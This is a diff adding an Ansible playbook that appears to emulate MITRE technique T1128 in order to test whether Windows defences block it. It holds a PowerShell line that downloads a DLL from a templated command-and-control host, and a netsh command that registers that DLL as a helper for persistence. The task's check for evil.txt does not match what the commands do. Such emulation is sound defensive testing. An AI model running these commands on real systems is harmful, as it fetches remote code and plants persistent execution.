@@ -1,0 +1,24 @@
+#T1128 - Netsh Helper DLL
+- name: Netsh Helper DLL - Windows
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name: Run Rundll32 to download and execute script (create a new file evil.txt)
+      win_shell: |
+        #'echo whoami > whoami.txt'
+        '$dll = Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }} '
+        'netsh.exe add helper C:\temp\{{ cnc_dll }}'
+    - name: check file exist
+      tags: always
+      win_stat:
+        path: evil.txt
+      register: T1128
+    - name: check if playbook was blocked
+      tags: always
+      debug: msg="Playbook Completed:T1128:blocked:win:"
+      when: T1128.stat.exists == False        
+    - name: check if playbook was successfull
+      tags: always
+      debug: msg="Playbook Completed:T1128:passed:win:"
+      when: T1128.stat.exists  
